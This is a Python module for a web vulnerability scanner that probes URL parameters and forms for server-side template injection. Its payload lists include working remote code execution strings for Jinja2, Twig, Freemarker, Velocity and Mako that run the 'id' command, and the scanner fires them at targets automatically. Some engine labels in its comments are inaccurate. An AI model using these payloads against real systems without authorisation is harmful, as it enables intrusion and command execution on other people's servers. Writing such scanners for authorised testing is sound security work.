#!/usr/bin/env python3

import re
import random
import string
import hashlib
import requests
import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style

class SSTIScanner:
    """Scanner for detecting Server-Side Template Injection (SSTI) vulnerabilities"""
    
    def __init__(self, scanner_instance):
        """
        Initialize the SSTI Scanner with a reference to the main scanner instance
        
        Args:
            scanner_instance: The main WebScanner instance
        """
        self.scanner = scanner_instance
        self.target_url = scanner_instance.target_url
        self.session = scanner_instance.session
        self.timeout = scanner_instance.timeout
        self.verbose = scanner_instance.verbose
        self.max_threads = scanner_instance.max_threads
        self.vulnerabilities = scanner_instance.vulnerabilities
        self.ssti_vulnerabilities = scanner_instance.ssti_vulnerabilities
        self.forms = scanner_instance.forms
        self.discovered_urls = scanner_instance.discovered_urls
        
        # Generate unique identifiers to avoid false positives
        self.random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        self.random_number = random.randint(10000, 99999)
        self.random_result = random.randint(100000, 999999)
        
        # Template payloads for various template engines
        self.ssti_payloads = {
            # Jinja2 / Twig payloads
            'jinja2': [
                f'${{7*{self.random_number}}}',  # Simple math calculation
                f'{{{{7*{self.random_number}}}}}',  # Jinja2 double curly braces
                f'{{% if 7*{self.random_number} == {7*self.random_number} %}}SSTI{self.random_str}{{% endif %}}',  # Conditional expression
                '{{ [].class.base.subclasses() }}',  # Dangerous for verification
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',  # RCE attempt
            ],
            # PHP Twig payloads
            'twig': [
                f'{{{{ 7*{self.random_number} }}}}',
                '{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}',
            ],
            # PHP Smarty payloads
            'smarty': [
                '{php}echo ' + str(self.random_number) + '*7;{/php}',
                '{math equation="x * y" x=7 y=' + str(self.random_number) + '}',
            ],
            # Freemarker payloads
            'freemarker': [
                f'${{{self.random_number}*7}}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            ],
            # Velocity payloads
            'velocity': [
                '#set($x=' + str(self.random_number) + ')' + str(7) + '*$x',
                '#set($e="e")#set($x=$e.getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null).exec("id"))',
            ],
            # Mako payloads
            'mako': [
                f'${{7 * {self.random_number}}}',
                '<%\n    import os\n    x=os.popen("id").read()\n%>${x}',
            ],
            # Django payloads
            'django': [
                f'{{{{ {self.random_number}|add:"0" }}}}',
                f'{{% if {self.random_number}|add:"0" == {self.random_number} %}}SSTI{self.random_str}{{% endif %}}',
            ],
            # Generic payloads
            'generic': [
                f'${{7*{self.random_number}}}',  # Expression in ${}
                f'${{{self.random_number}*7}}',  # Expression in ${} with different order
                '{7*' + str(self.random_number) + '}',  # Expression in {}
                '{$' + str(self.random_number) + '*7}',  # Expression in {}$ with different order
                '#{' + str(self.random_number) + '*7}',  # Expression in #{}
                '#${' + str(self.random_number) + '*7}',  # Expression in #${}
                '@{' + str(self.random_number) + '*7}',  # Expression in @{}
                '${{' + str(self.random_number) + '*7}}',  # Expression in ${{}}
                '#{{' + str(self.random_number) + '*7}}',  # Expression in #{{}}
                '#{{' + str(self.random_number) + '*7}}',  # Expression in #{{}}
                '${{' + str(self.random_number) + '*7}}',  # Expression in ${{}}
                '{%{' + str(self.random_number) + '*7}%}',  # Expression in {%{}%}
                f'<%= {self.random_number}*7 %>',  # ERB expression
                '<#assign x=' + str(self.random_number) + '*7>${x}',  # FreeMarker/Velocity
                '$eval{' + str(self.random_number) + '*7}',  # AngularJS
                '[[' + str(self.random_number) + '*7]]',  # Liquid
                '+#{' + str(self.random_number) + '*7}+',  # Slim
                '{{' + str(self.random_number) + '*7}}',  # Nunjucks/Swig/EJS style
                '${{' + str(self.random_number) + '*7}}',  # JSX/React style
                '%{{' + str(self.random_number) + '*7}}%',  # Python f-string style
                f'##[[${{7*{self.random_number}}}]]##',  # Various combinations
            ]
        }
        
        # Regexes to detect successful SSTI based on our random number
        self.random_result_regex = re.compile(r'.*{}.*'.format(7 * self.random_number))
        self.ssti_marker_regex = re.compile(r'SSTI{}.*'.format(self.random_str))
        
        # This helps us identify what template engine is being used
        self.template_signatures = {
            'jinja2': f'{{{{7*{self.random_number}}}}}',
            'twig': f'{{{{ 7*{self.random_number} }}}}',
            'smarty': '{math equation="x * y" x=7 y=' + str(self.random_number) + '}',
            'freemarker': f'${{{self.random_number}*7}}',
            'velocity': '#set($x=' + str(self.random_number) + ')' + str(7) + '*$x',
            'mako': f'${{7 * {self.random_number}}}',
            'django': f'{{{{ {self.random_number}|add:"0" }}}}'
        }
    
    def test_url_parameters(self, url):
        """
        Test URL parameters for SSTI vulnerabilities
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Parse the URL to get the base and parameters
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            query_params = parse_qs(parsed_url.query)
            
            # If there are no parameters, return empty list
            if not query_params:
                return vulnerabilities
            
            # For each parameter in the URL, test with our payloads
            for param, values in query_params.items():
                original_value = values[0] if values else ''
                
                # Test with each set of payloads
                for engine, payloads in self.ssti_payloads.items():
                    for payload in payloads:
                        # Create a modified query parameter
                        modified_params = query_params.copy()
                        modified_params[param] = [f"{original_value}{payload}"]
                        
                        # Reconstruct the URL with the modified parameter
                        query_string = '&'.join([f"{k}={v[0]}" for k, v in modified_params.items()])
                        test_url = f"{base_url}?{query_string}"
                        
                        try:
                            # Send the request with the payload
                            response = self.session.get(test_url, timeout=self.timeout)
                            
                            # Check if the response contains our expected result or marker
                            if self.random_result_regex.search(response.text) or self.ssti_marker_regex.search(response.text):
                                vuln = {
                                    'type': 'SSTI',
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'engine': engine,
                                    'severity': 'High',
                                    'evidence': f"Parameter '{param}' is vulnerable to SSTI with payload: {payload}"
                                }
                                vulnerabilities.append(vuln)
                                self.vulnerabilities.append(vuln)
                                self.ssti_vulnerabilities.append(vuln)
                                
                                if self.verbose:
                                    print(Fore.RED + f"[!] SSTI vulnerability found at {url}" + Style.RESET_ALL)
                                    print(Fore.RED + f"    Parameter: {param}" + Style.RESET_ALL)
                                    print(Fore.RED + f"    Payload: {payload}" + Style.RESET_ALL)
                                    print(Fore.RED + f"    Template Engine: {engine}" + Style.RESET_ALL)
                                
                                # If we found a vulnerability, we can skip other payloads for this parameter
                                break
                        
                        except requests.exceptions.RequestException as e:
                            if self.verbose:
                                print(Fore.YELLOW + f"[!] Error testing {url} for SSTI: {str(e)}" + Style.RESET_ALL)
                            continue
                    
                    # If we found a vulnerability with this engine, no need to check others
                    if vulnerabilities and vulnerabilities[-1]['parameter'] == param:
                        break
        
        except Exception as e:
            if self.verbose:
                print(Fore.YELLOW + f"[!] Error testing {url} for SSTI: {str(e)}" + Style.RESET_ALL)
        
        return vulnerabilities
    
    def test_form(self, form):
        """
        Test a form for SSTI vulnerabilities
        
        Args:
            form (dict): Form data
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        for input_field in form.get('inputs', []):
            # Skip fields that are unlikely to be vulnerable
            if input_field.get('type') in ['checkbox', 'radio', 'file', 'image', 'submit', 'button']:
                continue
            
            # For each parameter in the form, test with our payloads
            for engine, payloads in self.ssti_payloads.items():
                for payload in payloads:
                    # Prepare form data
                    data = {}
                    
                    # Fill in all form fields
                    for field in form.get('inputs', []):
                        # For our target field, add the payload
                        if field.get('name') == input_field.get('name'):
                            data[field.get('name')] = f"test{payload}"
                        # For other fields, provide valid values to pass basic validation
                        elif field.get('type') == 'email':
                            data[field.get('name')] = 'test@example.com'
                        elif field.get('type') == 'password':
                            data[field.get('name')] = 'Password123!'
                        elif field.get('type') == 'hidden':
                            data[field.get('name')] = field.get('value', '')
                        else:
                            data[field.get('name')] = 'test'
                    
                    try:
                        # Send the request with the payload
                        form_action = form.get('action', form.get('url', ''))
                        if not form_action:
                            continue
                            
                        # Make the absolute URL if needed
                        if not form_action.startswith(('http://', 'https://')):
                            form_action = urljoin(self.target_url, form_action)
                        
                        # Send the form data with the appropriate method
                        if form.get('method', '').upper() == 'GET':
                            response = self.session.get(form_action, params=data, timeout=self.timeout)
                        else:  # Default to POST if not specified
                            response = self.session.post(form_action, data=data, timeout=self.timeout)
                        
                        # Check if the response contains our expected result or marker
                        if self.random_result_regex.search(response.text) or self.ssti_marker_regex.search(response.text):
                            vuln = {
                                'type': 'SSTI',
                                'url': form.get('url', form_action),
                                'parameter': input_field.get('name'),
                                'payload': payload,
                                'engine': engine,
                                'severity': 'High',
                                'evidence': f"Form field '{input_field.get('name')}' is vulnerable to SSTI with payload: {payload}"
                            }
                            vulnerabilities.append(vuln)
                            self.vulnerabilities.append(vuln)
                            self.ssti_vulnerabilities.append(vuln)
                            
                            if self.verbose:
                                print(Fore.RED + f"[!] SSTI vulnerability found in form at {form.get('url')}" + Style.RESET_ALL)
                                print(Fore.RED + f"    Field: {input_field.get('name')}" + Style.RESET_ALL)
                                print(Fore.RED + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.RED + f"    Template Engine: {engine}" + Style.RESET_ALL)
                            
                            # If we found a vulnerability, we can skip other payloads for this parameter
                            break
                    
                    except requests.exceptions.RequestException as e:
                        if self.verbose:
                            print(Fore.YELLOW + f"[!] Error testing form at {form.get('url')} for SSTI: {str(e)}" + Style.RESET_ALL)
                        continue
                
                # If we found a vulnerability with this engine, no need to check others
                if vulnerabilities and vulnerabilities[-1]['parameter'] == input_field.get('name'):
                    break
        
        return vulnerabilities
    
    def guess_template_engine(self, vulnerable_url, parameter, payload):
        """
        Try to guess the template engine based on the payload that worked
        
        Args:
            vulnerable_url (str): The URL that is vulnerable
            parameter (str): The vulnerable parameter
            payload (str): The payload that worked
            
        Returns:
            str: Guessed template engine
        """
        # Check which template engine's signature matches our payload
        for engine, signature in self.template_signatures.items():
            if signature == payload:
                return engine
                
        # If we can't determine exactly, try more specific tests
        specific_tests = {
            'jinja2': [
                '{{request}}', 
                '{{config}}', 
                '{{url_for}}',
                '{{config.items()}}',
                '{{"".__class__.__mro__}}'
            ],
            'twig': [
                '{{_self}}',
                '{{_context}}',
                '{{app}}',
                '{{_charset}}',
                '{{constant("PHP_VERSION")}}'
            ],
            'smarty': [
                '{$smarty.version}',
                '{$smarty}',
                '{counter start=0}',
                '{counter}'
            ],
            'django': [
                '{% csrf_token %}',
                '{{ csrf_token }}',
                '{% url "index" %}',
                '{{ request }}'
            ],
            'velocity': [
                '#set($x = 1)',
                '#if($x == 1)yes#{else}no#end',
                '$TOOL.toString()'
            ],
            'freemarker': [
                '<#assign x=1>',
                '<#if x == 1>yes<#else>no</#if>',
                '${.version}',
                '${.output_format}'
            ],
            'mako': [
                '<%page args="x,y,z=None"/>',
                '${next.body()}',
                '<%def name="foo()"><%/def>'
            ]
        }
        
        try:
            parsed_url = urlparse(vulnerable_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            query_params = parse_qs(parsed_url.query)
            
            for engine, tests in specific_tests.items():
                for test in tests:
                    # Create a modified query parameter with the test
                    modified_params = query_params.copy()
                    modified_params[parameter] = [test]
                    
                    # Reconstruct the URL
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in modified_params.items()])
                    test_url = f"{base_url}?{query_string}"
                    
                    try:
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        # If the response doesn't have a 500 error and contains something specific to the engine
                        if response.status_code != 500:
                            if engine == 'jinja2' and ('werkzeug' in response.text.lower() or 'flask' in response.text.lower()):
                                return 'jinja2'
                            elif engine == 'twig' and ('symfony' in response.text.lower() or 'drupal' in response.text.lower()):
                                return 'twig'
                            elif engine == 'smarty' and ('smarty' in response.text.lower() or 'prestashop' in response.text.lower()):
                                return 'smarty'
                            elif engine == 'django' and ('django' in response.text.lower() or 'csrftoken' in response.text.lower()):
                                return 'django'
                    except:
                        pass
        except:
            pass
        
        # Default to "unknown" if we can't determine the template engine
        return "unknown"
    
    def run(self):
        """
        Run the SSTI scanner on discovered URLs and forms
        
        Returns:
            int: Number of vulnerabilities found
        """
        ssti_count = 0
        
        if self.verbose:
            print(Fore.BLUE + "[*] Testing for SSTI vulnerabilities..." + Style.RESET_ALL)
        
        # Test URL parameters for all discovered URLs
        discovered_urls = [url if isinstance(url, str) else url.get('url', '') for url in self.discovered_urls]
        discovered_urls.append(self.target_url)  # Also test the target URL
        
        # Remove duplicates and empty URLs
        discovered_urls = list(set(url for url in discovered_urls if url))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            url_results = list(executor.map(self.test_url_parameters, discovered_urls))
        
        # Test forms
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            form_results = list(executor.map(self.test_form, self.forms))
        
        # Count how many SSTI vulnerabilities were found
        ssti_vulnerabilities = len(self.ssti_vulnerabilities)
        
        print(Fore.GREEN + f"[+] Completed SSTI testing, found {ssti_vulnerabilities} vulnerabilities" + Style.RESET_ALL)
        return ssti_vulnerabilities 